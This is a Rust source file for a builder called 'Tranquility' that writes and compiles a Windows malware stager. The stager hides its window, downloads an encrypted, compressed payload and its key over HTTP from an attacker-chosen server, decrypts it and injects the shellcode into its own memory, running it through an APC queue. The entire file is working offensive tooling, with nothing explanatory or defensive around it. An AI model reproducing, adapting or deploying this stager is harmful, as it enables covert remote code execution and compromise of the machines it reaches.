//What is wrong with you? And why are you blue?
use clap::{App, Arg};
use std::fs::{self};
use std::process::Command;
use std::error::Error;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let matches = App::new("Tranquility")
        .version("1.0")
        .author("Dylan Como")
        .about("Generates the tranquility stager...")
        .arg(Arg::new("ip")
             .short('i')
             .long("ip")
             .takes_value(true)
             .required(true)
             .help("IP address of the server"))
        .arg(Arg::new("port")
             .short('p')
             .long("port")
             .takes_value(true)
             .required(true)
             .help("Port number of the server"))
        .arg(Arg::new("filename")
             .short('f')
             .long("filename")
             .takes_value(true)
             .required(true)
             .help("Name of the L33t_Pay10ad"))
        .get_matches();

    let ip = matches.value_of("ip").unwrap();
    let port = matches.value_of("port").unwrap();
    let filename = matches.value_of("filename").unwrap();

    let source_code = generate_source_code(ip, port, filename);

    let project_dir = "tranquility";
    fs::create_dir_all(format!("{}/src", project_dir))?;
    fs::write(format!("{}/src/main.rs", project_dir), source_code)?;

    let cargo_toml_content = format!(r#"
[package]
name = "tranquility" # change this to your actual package name
version = "0.1.0"
edition = "2018"

[dependencies]
reqwest = {{ version = "0.11", features = ["blocking"] }}
flate2 = "1.0"
aes = "0.7"
block-modes = "0.8"
hex = "0.4"
ntapi = "0.4"
winapi = {{ version = "0.3", features = ["memoryapi"] }}
tokio = {{ version = "1", features = ["full"] }}
"#);
    fs::write(format!("{}/Cargo.toml", project_dir), cargo_toml_content)?;

    Command::new("cargo")
        .current_dir(project_dir)
        .arg("build")
        .arg("--release")
        .status()?;

    Ok(())
}

fn generate_source_code(ip: &str, port: &str, filename: &str) -> String {
    format!(r#"
#![windows_subsystem = "windows"]
use reqwest::blocking::{{self, Response}};
use flate2::read::GzDecoder;
use aes::Aes256;
use block_modes::{{Cbc, BlockMode, block_padding::Pkcs7}};
use std::io::{{self, Read}};
use hex;
use std::ptr::null_mut;
use ntapi::ntmmapi::{{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory}};
use ntapi::ntpsapi::{{NtQueueApcThread, NtTestAlert, NtCurrentProcess, NtCurrentThread}};
use winapi::um::winnt::{{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE}};
use winapi::ctypes::c_void;
use tokio;
type Aes256Cbc = Cbc<Aes256, Pkcs7>;

fn fetch_file(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {{
    let response: Response = blocking::get(url)?;
    let bytes = response.bytes()?;
    Ok(bytes.to_vec())
}}

fn fetch_and_decrypt(server_addr: &str, filename: &str, port: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {{
    let file_url = format!("http://{{}}:{{}}/{{}}", server_addr, port, filename);
    let key_url = format!("http://{{}}:{{}}/{{}}.key", server_addr, port, filename);

    let encrypted_data = fetch_file(&file_url)?;

    let (iv, encrypted_compressed_data) = encrypted_data.split_at(16);

    let key_hex = fetch_file(&key_url)?;
    let key = hex::decode(std::str::from_utf8(&key_hex)?)?;

    let cipher = Aes256Cbc::new_from_slices(&key, iv).expect("Invalid key/IV");
    let compressed_data = cipher.decrypt_vec(encrypted_compressed_data)?;

    let mut decoder = GzDecoder::new(&compressed_data[..]);
    let mut decompressed_data = Vec::new();
    decoder.read_to_end(&mut decompressed_data)?;

    Ok(decompressed_data)
}}

unsafe fn execute_shellcode(shellcode: &[u8]) -> io::Result<()> {{
    let mut allocstart: *mut c_void = null_mut();
    let mut size: usize = shellcode.len();

    NtAllocateVirtualMemory(
        NtCurrentProcess,
        &mut allocstart,
        0,
        &mut size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    NtWriteVirtualMemory(
        NtCurrentProcess,
        allocstart,
        shellcode.as_ptr() as _,
        shellcode.len(),
        null_mut(),
    );

    let mut old_protect: u32 = 0;
    NtProtectVirtualMemory(
        NtCurrentProcess,
        &mut allocstart,
        &mut size,
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );

    NtQueueApcThread(
        NtCurrentThread,
        Some(std::mem::transmute(allocstart)),
        allocstart,
        null_mut(),
        null_mut(),
    );

    NtTestAlert();

    Ok(())
}}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {{
    let server_addr = "{}";
    let port = "{}";
    let filename = "{}";

    let decrypted_shellcode = fetch_and_decrypt(&server_addr, &filename, &port)?;

    unsafe {{
        execute_shellcode(&decrypted_shellcode)?;
    }}

    Ok(())
}}
"#, ip, port, filename)
}

